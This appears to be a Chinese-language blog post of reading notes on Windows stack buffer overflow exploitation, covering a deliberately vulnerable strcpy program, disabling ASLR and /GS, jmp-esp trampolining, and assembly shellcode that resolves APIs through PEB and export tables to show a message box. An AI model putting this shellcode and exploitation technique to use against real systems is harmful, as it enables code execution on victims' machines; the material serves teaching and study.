---
layout: post
title: "Stack buffer overflow"
subtitle: "在栈缓冲区溢出的边缘跃跃欲试"
date: 2018-12-01 22:59
tags: 
    - Assembly
    - Win32
---

# Content

程序在处理数据的过程中往往需要将数据存储到缓冲区，如果程序没有限制输入数据的长度就会存在所谓的 _缓冲区溢出_ 风险；攻击者可通过精心构造的输入(malformed inputs)改变程序执行流程。此外，如果缓冲区布置在 **栈** 上，越过缓冲区的数据可能会 **覆盖返回地址**，恶意代码可能得到执行。这类构造的输入称为 shellcode。

利用栈缓冲区溢出攻击的原理离不开以下关键因素：

1. 不安全的字符串处理函数(`strcpy`, `memcpy`, 或者自己/第三方的实现)，或
2. 向函数传递了错误的缓冲区长度参数。比如程序员手滑将`200`打错变成`0x200`；
3. 返回地址(RA)。函数调用结束之后，RA 从调用栈栈顶被弹出到`eip`，当前程序跳转到返回地址处的指令。

在 x86 下，[栈向下生长](https://stackoverflow.com/a/664779/8706476)（从高地址到低地址），当前函数的返回地址高于缓冲区起始地址。然而栈的生长方向和是否存在缓冲区溢出风险无关；即使将栈设置为向上生长（ARM程序在编译时可以指定栈的生长方向），攻击者仍然可以覆盖调用子函数的返回地址，详细见[wiki](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stacks_that_grow_up)。

## Overview

本文是 [《0day安全（第2版）》](https://book.douban.com/subject/6524076/) 一书第2、3章的读书笔记。

OS|IDE|Configuration|Goal
-|-|-|-
Windows 10 x64|VS2017|Debug|注入并且执行能够弹出对话框的代码。



### Victim

```cpp
// stack-buffer-overflow.cpp
// stack-buffer-overflow.exe
#include <cstdio>
#include <cstring>
#include <Windows.h>

int main(int argc, char* argv[], char* envp[]) {
    LoadLibrary(TEXT("user32.dll"));

    char input[1024];
    scanf("%s", input);

    foo(input);

    return 0;
}

void foo(const char* str) {
    char buffer[48];
    strcpy(buffer, str);
}
```

- `foo` 函数的作用仅仅是提供一个缓冲区溢出的漏洞；
- `LoadLibrary(TEXT("user32.dll"))` 是为了能在恶意代码中调用 `MessageBoxA`，但这条语句只在第一个例子中才是必需的。

## The first attempt

### Prerequisite

从第一篇研究缓冲区溢出的文章 _Smashing The Stack For Fun and Profit_(1996) 到现在已经过去20+年，在此期间编译器发展出许多应对缓冲区溢出的措施。和书中例子直接注入 shellcode 不同，这里的程序在编译之前要做一些额外的配置工作：

- 关闭 ASLR([Address space layout randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization))，让目标程序的映像装载到固定基址`0x400000`：
    - "Linker" > "Advanced" > "[Randomized Base Address](https://stackoverflow.com/a/9561294/8706476)" : `/DYNAMICBASE:NO` 
    - [ASLR](https://docs.microsoft.com/en-us/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=vs-2017) 引入自 Windows Vista
- 关闭运行时栈帧错误检查：
    - "C/C++" > "Code Generation" > "Basic Runtime Checks" : `/RTCu` 或空白。
    - `/RTCs` 会在函数返回之前引入 `__RTC_CheckEsp`
- 关闭安全检查：
    - "C/C++" > "Code Generation" > "Security Check" : `/GS-`。
    - `/GS` 会引入 `__security_check_cookie `
- 为方便起见用文件代替输入：
    - Debugging 标签页 "Command Arguments": `< "$(ProjectDir)\stack-buffer-overflow.in"`

### Steps

- 获取 Windows API `MessageBoxA` 和 `ExitProcess` 的地址
- 确定第一条指令的地址。这个地址将被用来覆盖 RA，通常位于缓冲区内。
- 确定 RA 到缓冲区的偏移，以保证 RA 被正确覆盖。
- 设计指令并获取机器码。

一些调试器，比如 [x64dbg](https://github.com/x64dbg/x64dbg)，在调试过程中可以浏览模块导出/导入符号，藉此可以快速定位函数地址。`MessageBoxA` 的地址为 `0x745E7E60`(user32)，`ExitProcess` 的地址为 `0x74F43A10`(kernel32)。而目标程序 `void foo(const char*)` 的实现如下：

![Assembly]({{ "img/stack-buffer-overflow-foo.png" | absolute_url }})


调试目标程序，可见当前 `ebp` 为 `0x0019FA2C`，缓冲区 `buffer` 起始于 `ebp-0x30`，而 RA 位于 `ebp+4`。站在攻击者的角度，若选择把第一条指令放到缓冲区起始的位置，

- 第一条指令的地址就是 `0x0019FA2C` - `0x30` = `0x0019F9FC`；
- RA 相对与缓冲区的位移是 `0x34`；不足 `0x34` 的部分用无实际作用的指令填充，比如`0x90`(`nop`)；
- 最后将 `0x0019F9FC` 按照小端格式追加到尾部

shellcode 的布局如下：

![Layout of shellcode]({{ "img/stack-buffer-overflow-layout.png" | absolute_url }})

构造如下代码

```cpp
_asm {
shellcode_start:    
    xor ebx, ebx        // \x33\xDB             ;Avoid explicit zeros
    mov bl, 0x80        // \xB3\x80
    sub esp, ebx        // \x2B\xE3             ;Lift stack pointer
    xor ebx, ebx        // \x33\xDB             ;Produce zeros
    push ebx            // \x53                 ;Null character
    push 0x4C494146     // \x68\x46\x41\x49\x4C ;ASCII "FAIL" in little-endian
    mov eax, esp        // \x8B\xC4             ;Load address of string "FAIL"
    push ebx            // \x53                 ;0
    push eax            // \x50                 ;Address of string "FAIL"
    push eax            // \x50                 ;Address of string "FAIL"
    push ebx            // \x53                 ;0
    mov eax, 0x745E7E60 // \xB8\x60\x7E\x5E\x74 ;Address of MessageBoxA
    call eax            // \xFF\xD0             ;MessageBoxA(0, eax, eax, 0)
    // No zeros at the top of stack due to caller of MessageBoxA cleaning arguments
    push ebx            // \x53                 
    mov eax, 0x74F43A10 // \xB8\x10\x3A\xF4\x74 ;Address of ExitProcess  
    call eax            // \xFF\xD0             ;ExitProcess(0)
    nop                 // \x90
    nop
    nop
}
```

最后将代码、填充字节和地址 `0x0019F9FC` 拼接成为长度为 `0x34` 的shellcode:

Code|Padding bytes|Address of the code
-|-|-
"\x33\xDB...\xFF\xD0"|"\x90\x90...\x90"|"\xfc\xf9\x19\x00"

然后将 shellcode 写入输入文件，Ctrl+F5 运行 stack-buffer-overflow.exe 即可观察到弹窗，这表示 shellcode 得到执行。


### Issues

值得注意的是：

- 无论运行多少次，ntdll 总是被装载到同一个基址；它的装载基址总是最高；
- shellcode 位于栈上， 其指令执行顺序和栈的生长方向正好相反。为了防止 shellcode 被覆盖，要事先将栈顶“抬高”到 shellcode 之前；
- shellcode 要避免出现能截断输入的字符：
    - `strcpy` 函数在空字符 `\x00` 处截断参数字符串；
    - `scanf` 函数会在一些空白字符处截断输入。[空白字符](http://www.cplusplus.com/reference/cstdio/scanf/#parameters)包括`' '`(`0x20`), `\t`(`0x09`), `\n`(`0x0A`), `\v`(`0x0B`), `\f`(`0x0C`) 和 `'\r'`(`0x0D`)
- shellcode 的长度可以不受缓冲区长度限制。攻击者可以在 RA 之前用 `jmp` 指令跳过 RA，以防止 RA 被译码为指令。

这个例子存在不足之处，比如：

- 无法应对启用 ASLR 的目标程序；
- 需要手工查询所需要的 API 的地址；


## Trampolining

如果目标程序启用了 ASLR (`/DYNAMICBASE:YES`)，装载基址不可预知，攻击者无法确定精确定位 shellcode，因此上述方法就不再奏效。

但在函数返回之后(`ret`)，RA 从栈顶弹出。如果将 shellcode 的第一条指令放在 RA 之后(`RA+0x4`)，在 RA 从栈顶弹出后，shellcode 就会出现在栈顶，即 `esp` 包含 shellcode 的起始地址。

### Jump to register

"[jump to register](https://en.wikipedia.org/wiki/Buffer_overflow#The_jump_to_address_stored_in_a_register_technique)" 正是利用了这一点。该技术的另一个关键点在于使用另一条同样存在于进程地址空间的 **跳转指令的地址** 来覆盖 RA。如果这一条指令是 `jmp esp`，目标程序会跳转到 `jmp esp`，之后再跳转到 shellcode。类似地， `call esp` 也能实现跳转到栈顶的功能，但应注意在`esp` 作为 RA 入栈的同时 `esp` 的值也被增加(+4)。这类指令被称为 **跳板** (trampoline)，又因为攻击者往往挑选那些存在于其它 DLL 的指令，该技术称作"DLL trampolining"。使用跳板的 shellcode 布局如下：

![Layout of shellcode using trampoline]({{ "img/stack-buffer-overflow-trampoline.png" | absolute_url }})

攻击者仍然可以选择将代码安排在缓冲区中，这需要额外实施一个跳转；跳转偏移的机器码可以靠标签确定：

![Layout of shellcode using trampolines]({{ "img/stack-buffer-overflow-trampoline-in-buffer.png" | absolute_url }})

`jmp esp` 对应机器码为 `ffe4`，长度为2字节，在 ntdll 搜索到两个地址：`0x77B0181C` 和 `0x77B1E213`，巧合的是这两个结果都位于 .text 段。以`0x77B0181C`为例， shellcode 有两种组织方式：

Padding bytes|Address of trampoline|Code
-|-|-
"\x90\x90...\x90"|"\x1c\x18\xb0\x77"|"\x33\xDB...\xFF\xD0"

和

Code|Padding bytes|Address of trampoline|Jump to `shellcode_start`
-|-|-|-
"\x33\xDB...\xFF\xD0"|"\x90\x90...\x90"|"\x1c\x18\xb0\x77"|"\xEB\xC6"

跳板不一定是 `jmp esp` ，也不一定是确实存在于 .text 段的指令；它只是一段能被译码(decode)成为合适指令的字节序列：它可以是 .text 段中某条指令的一部分，也可以是内存中的静态数据。

和上一个例子相比，DLL trampolining 无需知晓 shellcode 的确切地址。它并没有完全绕过 ASLR ；准确地说，目标程序是否启用 ASLR 不重要，攻击者只关心跳板所在的 [DLL 是否启用 ASLR](https://security.stackexchange.com/questions/157478/why-jmp-esp-instead-of-directly-jumping-into-the-stack?newreg=fcced9b3d0fe4084b37537565d1bc739#comment298580_157478)。这个例子的意义在于，在目标程序启用了 ASLR 的情况下，攻击者仍然可以尝试在进程地址空间寻找那些没有启用 ASLR 而总是使用固定基址的 DLL。换言之，**跳板只对那些没有启用 ASLR 的模块有效**；一旦所有代码都启用了 ASLR ，上述用于精确定位 shellcode 的手段将会失效。

对于 ntdll，可以在 Developer Command Prompt 通过`dumpbin /headers %WINDIR%/system32/ntdll.dll` 命令观察到 DLL characteristics 包含 Dynamic base，这说明它启用了ASLR。**在不同主机上，ntdll 的装载基址可能不同**；之所以能够在上一例子中观察到固定基址，猜测是因为 ntdll 在开机时被装载，直到关机之前都不会被完全释放。kernel32 也是同样道理。

两个例子没有绝对意义上的优劣之分，只有根据实际情况才能决定使用何种方法；具体问题具体分析，这是一个放之四海而皆准的道理。


## Locate Windows APIs

到目前为止，所有 API 的地址都要靠事先手工查询，显然这是一件费时费力的工作。较为理想的做法是让 shellcode 完成所有定位 API 的工作。

定位 API 的方法依赖一些没有正式写入 MSDN 的特性(undocumented features)，其中包括但不限于

- `TEB`, Thread Environment Block, aka [Thread Information Block](https://en.wikipedia.org/wiki/Win32_Thread_Information_Block)
    - `TLS`, Thread Local Storage。注意这是操作系统中的概念而不是 Windows 特有的设计；
- `PEB`, [Process Environment Block](https://en.wikipedia.org/wiki/Process_Environment_Block)
- `LDR_DATA_TABLE_ENTRY` 
- `LDR_DATA_TABLE_ENTRY`

有的特性不仅缺少官方文档描述，在 SDK 中往往也没有正式名称，或是带着“reserved”字样作为 `PVOID` 数组存在，或是在以后版本的 Windows 可能被改变。

整个定位 API 的过程沿着以下思路：

1. 访问线程局部存储信息 `TEB`；
2. 找到当前进程信息 `PEB` ；
3. 在(模块初始化)列表中找到所在模块的映像(Image)；
4. 找到导出表；
5. 找到函数的地址；
6. 定位其它模块的函数需要先通过 `LoadLibraryA` 装载模块，然后在按照3~5找到函数地址。

以`LoadLibraryA`为例，查找`LoadLibraryA` 的详细步骤如下图：

![Locate APIs]({{ "img/stack-buffer-overflow-locate-api.png" | absolute_url }})

1. `fs:[0x30]` 得到`TEB::ProcessEnvironmentBlock`，这是指向 `PEB` 结构体的 **指针**；
   - 我的[另一篇文章]({{ site.baseurl }}{% post_url 2018-11-12-Segment-registers %})记录了一些段寄存器的历史；
   - `mov eax, fs:[0x30]` 和 `mov eax, fs:[eax+0x30]` 生成的机器码不一样；前者为 `"\x64\xA1\x30\x00\x00\x00"` ，后者的机器码为 `"\x64\x8B\x40\x30"` 而且不包含截断输入的字符。连这样细微的差别都能注意到，只能说 shellcode 的作者实在是6啊。
1. `TEB::ProcessEnvironmentBlock` 偏移 `0xC` 为 `PEB::Ldr`，这是指向 `PEB_LDR_DATA` 结构体的 **指针**；
2. `PEB::Ldr` 偏移 `0x1C` 是 `InInitializationOrderModuleList` 结构体。
    - 这是双向链表的结点，它的成员 `Flink` 指针指向后继结点，`Blink` 指针指向前驱结点。
    - 除去这个头节点（作为 `PEB_LDR_DATA` 成员存在），其它结点是另一个结构体 `LDR_DATA_TABLE_ENTRY` 的成员；每个 `LDR_DATA_TABLE_ENTRY` 结构体都对应一个模块，包含模块名称(UTF-16)和装载基址等信息。
    - 头节点的后继节点是 ntdll 。 kernelbase 是第二个节点，kernel32 是第三个节点；但 kernel32 在书中(P87)是第二个节点，具体不同见 [Misc]({{ page.url }}#Misc)；
    - kernel32 导出 `LoadLibraryA` 和 `ExitProcess`；
3. `InInitializationOrderModuleList:Flink` 偏移 `0x08` 是模块的**装载基址**。从装载基址开始就是模块的映像。幸运的是，和 `TEB` 以及 `PEB` 不同，PE 格式在 MSDN 上有[详细的描述](https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format)。
    - 装载基址偏移`0x3c`处存储 PE 签名的偏移。PE 签名是一个 4 字节的数据；在这个 PE 签名之后才是 PE headers，其组织形式和二进制网络协议类似，在特定偏移处存储特定信息。
    - 从 PE 签名开始偏移`0x78` 开始是 `IMAGE_DATA_DIRECTORY` 数组，而第一项就是导出表(相对于装载基址的偏移和大小)
4. 导出表对应 `IMAGE_EXPORT_DIRECTORY` 结构体。以下三个数据成员对应三个数组：
   - +`0x1C`：`AddressOfFunctions`，函数地址数组；
   - +`0x20`：`AddressOfNames`，函数名称数组；
   - +`0x24`：`AddressOfNameOrdinals`，数组元素是 `AddressOfNames`中对应位置的函数名，在`AddressOfFunctions`中的次序（好拗口）；
   - 这个过程就是：先找到字符串 `"LoadLibraryA"`（的偏移） 在 `AddressOfNames`的索引`i`，然后通过 `AddressOfNameOrdinals[i]` 得到次序`ord`，最后 `AddressOfFunctions[ord]` 就是 `LoadLibraryA` 的地址。
   - 注意，出现在这个结构体中的地址都是相对于装载基址的偏移。

![Locate APIs]({{ "img/stack-buffer-overflow-EAT.png" | absolute_url }})

最后附上原书P93-P95的可执行代码以及注释。使用指令比较字符串是一件麻烦的事(`ucrtbase!strcmp`)，因此作者采用哈希值代替：

```cpp
// hash function
DWORD GetHash(const char *src) {
    DWORD hash = 0;
    while (*src) {
        hash = ((hash << 25) | (hash >> 7)); // circular right shift 7 bits
        hash += *src;
        src++;
    }
    return hash;
}
```

可执行代码：

```cpp
_asm {
    cld
    push 0x1E380A6A         // hash of MessageBoxA
    push 0x4FD18963         // hash of ExitProcess
    push 0x0C917432         // hahs of LoadLibraryA     ;esi
    mov esi, esp
    lea edi, [esi-0xC]      // edi = address at which to results are stored

    //
    // allocate space on the stack to protect shellcode from being overwritten
    //
    xor ebx, ebx
    mov bh, 0x04        // avoid explicit zeros
    sub esp, ebx        

    //
    // push ascii string "user32"
    //
    mov bx, 0x3233      // avoid explicit zeros
    push ebx
    push 0x72657375
    push esp
    xor edx, edx

    // Instead of "mov ebx, fs:[0x30]"
    // ebx = address of peb
    mov ebx, fs:[edx+0x30]          
     // ecx = address of ldr
    mov ecx, [ebx + 0x0c]      
    // ecx = address of 1st node: ntdll
    mov ecx, [ecx + 0x1c]       
    // ecx = address of 2nd second node: kernelbase
    mov ecx, [ecx]              
    // ecx = address of 3rd third node: kernel32
    mov ecx, [ecx]              
    mov ebp, [ecx + 0x08]       // ebp = base address of the kernelbase.dll image

find_lib_functions:        
    // load a double-word into eax from the location pointed by esi
    // get the hash we just found
    lodsd                       
    cmp eax, 0x1E380A6A         // is that the last function(MessageBoxA) we have been searching?
    jne find_functions          // loop if not
    xchg eax, ebp
    call [edi-0x8]              // call LoadLibraryA
    xchg eax, ebp

find_functions:
    // push all 32-bit registers
    // eax, ecx, edx, ebx, original esp, ebp, esi and edi
    pushad                      
    mov eax, [ebp+0x3c]         // eax = RVA of PE header
    mov ecx, [ebp+eax+0x78]     // IMAGE_DATA_DIRECTORY.VirtualAddress
    add ecx, ebp                // ecx = address of IMAGE_EXPORT_DIRECTORY
    mov ebx, [ecx+0x20]         // ebx = RVA of AddressOfNames
    add ebx, ebp                // ebx = address of names table
    
    xor edi, edi                // 0

next_function_loop:
    inc edi
    mov esi, [ebx+edi*4]        // RVA of a function name
    add esi, ebp                // esi = address of a function name
    cdq

hash_loop:
    movsx eax, byte ptr[esi]    // get a byte
    cmp al, ah                  // check for null character
    jz compare_hash
    ror edx, 7                  // does this produce zeros?
    add edx, eax                // edx = hash
    inc esi
    jmp hash_loop

compare_hash:
    cmp edx, [esp+0x1c]         // original value of eax before pushad and after lodsd
    // is that the function name we are searching?
    jnz next_function_loop      // jump if not
    mov ebx, [ecx+0x24]         // ebx = RVA of AddressOfNameOrdinals
    add ebx, ebp                // ebx = address of AddressOfNameOrdinals
    mov di, [ebx+2*edi]         // edi = ordinal number
    mov ebx, [ecx+0x1c]         // ebx = RVA of AddressOfFunctions
    add ebx, ebp                // ebx = address of AddressOfFunctions
    add ebp, [ebx + edi * 4]    // ebp = the address of desired function
    xchg eax, ebp
    pop edi                     // restore edi
    stosd                       // store the value of eax into the location pointed by edi and then increment edi
    push edi                    // push the updated edi
    popad                       // restore all registers
    cmp eax, 0x1E380A6A         
    // is that the last function(MessageBoxA) we have been searching?
    jne find_lib_functions

function_call:
    xor ebx, ebx
    push ebx
    push 0x74736577             // tsew
    push 0x6c696166             // liaf
    mov eax, esp
    push ebx
    push eax
    push eax
    push ebx
    call [edi-0x04]
    push ebx
    call [edi-0x08]
    nop
    nop
    nop
    nop
}
```

### Misc

在书中(P87) dll 的初始化顺序为 ntdll->kernel32，而在这里是 ntdll->kernelbase->kernel32。虽然两个模块都能导出符号 `LoadLibraryA` 和 `ExitProcess`，但调用 `kernelbase!ExitProcess(0)` 会抛出 "Privileged instruction" 异常。加上和 `kernel32!ExitProcess` 的代码存在较大差异，猜测 `kernelbase!ExitProcess` 可能不包含能发挥作用的“代码”，其指针指向的内存包含杂乱无章的数据并被译码为特权指令。

![kernelbase!ExitProcess]({{ "img/stack-buffer-overflow-kernelbase-ExitProcess.png" | absolute_url }})

上图为 `kernelbase!ExitProcess`，下图为 `kernel32!ExitProcess`

![kernel32!ExitProcess]({{ "img/stack-buffer-overflow-kernel32-ExitProcess.png" | absolute_url }})